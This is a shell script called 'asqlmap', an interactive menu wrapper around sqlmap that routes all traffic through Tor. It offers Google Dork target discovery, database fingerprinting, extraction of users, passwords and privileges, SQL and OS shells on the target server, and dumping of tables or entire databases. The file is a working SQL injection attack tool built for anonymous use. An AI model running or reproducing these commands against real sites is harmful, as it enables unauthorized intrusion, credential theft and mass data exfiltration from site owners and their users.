#!/bin/sh
	clear
	ver="1.0.0"
	cat << EOF

	 █████  ███████  ██████  ██      ███    ███  █████  ██████
	██   ██ ██      ██    ██ ██      ████  ████ ██   ██ ██   ██
	███████ ███████ ██    ██ ██      ██ ████ ██ ███████ ██████
	██   ██      ██ ██ ▄▄ ██ ██      ██  ██  ██ ██   ██ ██
	██   ██ ███████  ██████  ███████ ██      ██ ██   ██ ██
	                    ▀▀
EOF
	printf "\t\t\t\tv. $ver\n\n"

	tput bold
	tput setaf 2
	printf "\t[-]\tDeveloper:\tGualty\t\t\t\t[-]\n"
	printf "\t[-]\tWebsite:\thttp://github.com/Gualty\t[-]\n"
	tput sgr0
	tput setaf 7
	printf "\t[-]\t\t\t*********\t\t\t[-]\n"
	tput sgr0
	tput setaf 1
	printf "\t[-]\tEach operation will be performed using the Tor\t[-]\n"
	printf "\t[-]\t\toption for your anonymity\t\t[-]\n"
	printf "\t[-]\tCheck if TOR is running before start testing\t[-]\n"
	tput sgr0

	#Check if sqlmap is installed on the system
	sqlmapexist=$(which sqlmap)
	if [ -z "$sqlmapexist" ]; then
		tput setaf 1
		tput bold
		echo "\nERROR: sqlmap is not installed!\n\nInstall it before run asqlmap\n"
		tput sgr0
		exit 0
	fi

	#Variables from the command line
	l="1"
	r="1"
	t="1"
	#If 2° element is -r
	if [ "$2" = "-r" ]; then
		r=$3
	fi

	#If 4° element is -r
	if [ "$4" = "-r" ]; then
		r=$5
	fi

	#If 6° element is -r
	if [ "$6" = "-r" ]; then
		r=$7
	fi

	#If 2° element is -l
	if [ "$2" = "-l" ]; then
		l=$3
	fi

	#If 4° element is -l
	if [ "$4" = "-l" ]; then
		l=$5
	fi

	#If 6° element is -l
	if [ "$6" = "-l" ]; then
		l=$7
	fi

	#If 2° element is -t
	if [ "$2" = "-t" ]; then
		t=$3
	fi

	#If 4° element is -t
	if [ "$4" = "-t" ]; then
		t=$5
	fi

	#If 6° element is -t
	if [ "$6" = "-t" ]; then
		t=$7
	fi

	#Google Dork
	case $1 in
	-g) echo "\nATTENTION: Google can detect unusual traffic from Tor network.\nIf so, sqlmap, will ask you do use another search engine.\nPress ENTER to continue or CTRL+C to close asqlmap\n";read keypressed;sqlmap -g $2 --random-agent -b --dbs --tables --eta --tor --cleanup  ;echo "Google Dork search done\n\nPress any key to close asqlmap";read keypressed;exit;;
	esac
	#Check if the user specified an URL if is not a Google Dork search
	if [ -z "$1" ]
	then
		printf "\nNo URL specified. \nEg. ./asqlmap.sh http://www.example.com/index.php?id= \n\n"
		tput bold
		printf "Type ./asqlmap.sh -h to show the help page\n\n"
		tput sgr0
		printf "Press any key to close asqlmap\n";read keypressed;exit;
	fi
	if [ "$1" = "-h" ] || [ "$1" = "-help" ]; then
		echo "USAGE:\n\t./asqlmap.sh \"URL\" [OPTIONS]\nOptions after URL:\n\t-r <risk value>\t\tRisk of test to perform (1-3, default 1)\n\t-l <level value>\tLevel of test to perform (1-5, default 1)\n\t-t <# of threads>\tNumber of threads (1-10, default 1)\nOptions without URL:\n\t-g <google dork>\tSearch for Google Dorks\n\t-purge\t\t\tSecurely erase the sqlmap output directory\n\t-h,-help\t\tShow this help\n\t-v\t\t\tShow the version of asqlmap"
		exit 0
	fi
	if [ "$1" = "-v" ]; then
		echo "\nasqlmap v. $ver\n"
		exit 0
	fi
	if [ "$1" = "-purge" ]; then
		printf "\nATTENTION: this operation will be irreversible.\nAll files will be overwritten with random data for security reasons.\nIf an error of sqlmap appear, update sqlmap and then run again the command.\nPress ENTER to continue or CTRL+C to abort.\n";read keypressed;sqlmap --purge -v 3;printf "sqlmap output folder was securely purged\n\nPress any key to continue";read keypressed;
		exit 0
	fi
	# The options menu
	printf "\nURL: "; echo $1
	printf "\nLEVEL: $l - RISK: $r - THREADS: $t\n";
	printf "\nSelect an option\n\n"

	printf "========================VULNERABILITY CHECK================================\n"
	printf "1)\tVulnerability check and information research (Databases,tables)\n"
	printf "2)\tUsers, passwords and privileges research\n"
	printf "=========================OPEN SHELL=========================================\n"
	printf "3)\tOpen SQL Shell\n"
	printf "4)\tOpen OS Shell\n"
	printf "=========================DATA RETRIEVING====================================\n"
	printf "5)\tDump single table (CSV)\n"
	printf "6)\tDump single table (HTML)\n"
	printf "7)\tDump single database (CSV)\n"
	printf "8)\tDump single database (HTML)\n"
	printf "9)\tDump all databases (CSV)\n"
	printf "10)\tDump all databases (HTML)\n"
	printf "11)\tRetrieve everything (CSV) - can take a long time!\n"
	printf "12)\tRetrieve everything (HTML) - can take a long time!\n"
	printf "=========================TOOLS==============================================\n"
	printf "13)\tUpdate this tool\n"
	printf "0)\tQuit\n"
	printf "asqlmap > "
	read choice
	# Execute the right operation based on the choice of the user
	case "$choice" in
		1) sqlmap -u $1 --fingerprint --random-agent --level=$l --risk=$r --threads=$t -b --dbs --tables --eta --tor --cleanup --exclude-sysdbs --crawl=2;echo "Vulnerability check done\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		2) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --users --passwords --privileges --eta --tor --cleanup   --exclude-sysdbs;echo "\nRetrieving credentials and privileges done\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		3) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --sql-shell  --eta --tor --cleanup  --exclude-sysdbs;echo "\nSQL Shell closed\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		4) sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --os-shell  --eta --tor --cleanup  --exclude-sysdbs;echo "\nOS Shell closed\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		5) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dump -T $tabella  --eta --tor --cleanup  --exclude-sysdbs;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read keypressed;$0 $1 $2 $3 $4 $5;;
		6) echo "\nTable name: "; read tabella; sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dump -T $tabella --dump-format=HTML --eta --tor --cleanup  --exclude-sysdbs;echo "\nDump of the table '$tabella' done\n\nPress any key to continuee";read keypressed;$0 $1 $2 $3 $4 $5;;
		7) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dump -D $database  --eta --tor --cleanup  --exclude-sysdbs;echo "\nDump of the database '$database' done\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		8) echo "\nDatabase name: "; read database; sqlmap -u $1 --random-agent --level=$l --risk=$r --threads=$t -b --dump -D $database --dump-format=HTML --eta --tor --cleanup  --exclude-sysdbs;echo "\nDump of the database '$database' done\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		9) sqlmap -u $1 --random-agent  --level=$l --risk=$r --threads=$t -b --dump-all --tor --eta --cleanup --exclude-sysdbs;echo "\nDump of all databases done\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		10) sqlmap -u $1 --random-agent  --level=$l --risk=$r --threads=$t -b --dump-all --dump-format=HTML --tor --eta --cleanup --exclude-sysdbs;echo "\nDump of all databases done\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		11) sqlmap -u $1 --random-agent  --level=$l --risk=$r --threads=$t -a --tor --eta --cleanup ;echo "\nAll information retrieved\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		12) sqlmap -u $1 --random-agent  --level=$l --risk=$r --threads=$t -a -dump-format=HTML --tor --eta --cleanup ;echo "\nAll information retrieved\n\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		13) git pull; echo "\nasqlmap updated\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
		0) echo "\nBye bye =)\n"; exit 0;;
		q) echo "\nBye bye =)\n"; exit 0;;
		exit) echo "\nBye bye =)\n"; exit 0;;
		quit) echo "\nBye bye =)\n"; exit 0;;
		*) echo "\nNot valid command\nPress any key to continue";read keypressed;$0 $1 $2 $3 $4 $5;;
	esac
